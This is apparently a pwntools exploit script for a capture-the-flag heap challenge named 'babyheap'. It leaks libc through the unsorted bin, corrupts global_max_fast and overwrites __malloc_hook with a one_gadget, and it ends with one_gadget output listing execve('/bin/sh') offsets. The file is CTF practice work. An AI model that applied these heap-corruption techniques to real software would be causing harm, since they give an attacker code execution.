#!/usr/bin/python3
from pwn import *

p=process(["babyheap"],env={"LD_PRELOAD":"/glibc/2.23/64/lib/libc.so.6"})
#p=remote("nc.eonew.cn",10502)
#p=process("babyheap-bak")
context.log_level='Debug'
context.terminal=context.terminal = ['tmux','splitw','-h' ]
gdb.attach(p)

r  = lambda data	:p.recv(data)
ru = lambda data 	:p.recvuntil(data)
s  = lambda data	:p.send(data)
sl = lambda data	:p.sendline(data)

def add(size,data):
  ru("your choice:")
  sl("1")
  ru("size:")
  sl(str(size))
  ru("data:")
  sl(data)

def delete(index):
  ru("your choice:")
  sl("2")
  ru("index:")
  sl(str(index))

def edit(index,data):
  ru("your choice:")
  sl("3")
  ru("index:")
  sl(str(index))
  ru("data:")
  s(data)

def show(index):
  ru("your choice:")
  sl("4")
  ru("index:")
  sl(str(index))


add(0x18,"A"*0x18)#0
add(0x18,"B"*0x18)#1
add(0x18,"C"*0x18)#2
add(0x18,"D"*0x18)#3
#add(0x38,"E"*0x38)#3
add(0x18,"F"*0x18)#4
add(0x18,"I"*0x18) #5
edit(0,"O"*0x18+"\x81")#1's size->0x81
delete(1) #free 1
add(0x18,"GGGG")#6 #let the unsorbin addr into chunk2
show(2) #leak libc addr


p.recv(6)
#print("libc"+hex(u64(p.recv(6).ljust(8,b"\x00"))))
unsortbin=u64(p.recv(6).ljust(8,b"\x00"))
libc=unsortbin-0x39bb78
print("[+] libc_addr="+hex(libc))


global_max_fast=3790920+libc

#unsort bin attack
add(0x18,"A"*0x18)#6
add(0x18,"B"*0x18)#7
add(0x18,"C"*0x18)#8
add(0x18,"D"*0x18)#9
add(0x18,"D"*0x18)#10

add(0x18,"E"*0x18)#11
add(0x68,"F"*0x68)#12
edit(12,p64(0)*3+p64(0x21)) #fake next_size(for fastbin attack)
add(0x18,"G"*0x18)#13
add(0x18,"H"*0x18)#14
#add(0x18,"I"*0x18)#15

delete(7)
delete(5)

edit(6,"O"*0x18+"\x61") #1's size->0x81
#add(0x58,"AAAAAAAAAA")
add(0x58,p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)+p64(0)+p64(global_max_fast-0x10))
add(21,"AAAA")#13  #unsort bin attack

#fastbin attack

free_hook=3790760+libc
malloc_hook=3783440+libc
#one_gadget= 0xf02b0+libc
one_gadget=0x41414141

delete(14)
delete(13)
delete(12)
delete(11)
delete(10)
delete(9)
#delete(15)

add(0x18,"a"*0x18)#9
add(0x18,"b"*0x18)#10
add(0x18,"c"*0x18)#11

edit(9,"a"*0x18+"\x61")
#edit(10,"b"*0x18+"\x71")
delete(10)
#delete(11)
add(0x58,p64(0)*3+p64(0x21)+p64(0)*3+p64(0x71)+p64(malloc_hook-35))
add(0x68,"AAAA")
add(0x68,b"F"*19+p64(one_gadget))

add(0x18,"PWN")

#add(0x18,"c"*18)#


#add(0x18,"abc")

#add(0x58,"unsort")


#add(0x21,"unsort")

#add(0x58,p64(0)*3+p64(0x21)+p64(global_max_fast))

#delete(7)
#add(0x58,p64(0)*3+p64(0x20)+p64(global_max_fast))
#add(0x18,"123")


#delete(5)
#edit(7,"aaa")
#edit(4)
#add(0x18,"unsortbin")




p.interactive()


'''
root@59b9934cad24:/ctf/work/babyheap# one_gadget -l1 libc-2.23.so 
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
      rax == NULL

      0x4526a execve("/bin/sh", rsp+0x30, environ)
      constraints:
            [rsp+0x30] == NULL

            0xcd0f3 execve("/bin/sh", rcx, r12)
            constraints:
                  [rcx] == NULL || rcx == NULL
                    [r12] == NULL || r12 == NULL

                    0xcd1c8 execve("/bin/sh", rax, r12)
                    constraints:
                          [rax] == NULL || rax == NULL
                            [r12] == NULL || r12 == NULL

                            0xf02a4 execve("/bin/sh", rsp+0x50, environ)
                            constraints:
                                  [rsp+0x50] == NULL

                                  0xf02b0 execve("/bin/sh", rsi, [rax])
                                  constraints:
                                        [rsi] == NULL || rsi == NULL
                                          [[rax]] == NULL || [rax] == NULL

                                          0xf1147 execve("/bin/sh", rsp+0x70, environ)
                                          constraints:
                                                [rsp+0x70] == NULL

                                                0xf66f0 execve("/bin/sh", rcx, [rbp-0xf8])
                                                constraints:
                                                      [rcx] == NULL || rcx == NULL
                                                        [[rbp-0xf8]] == NULL || [rbp-0xf8] == NULL

'''

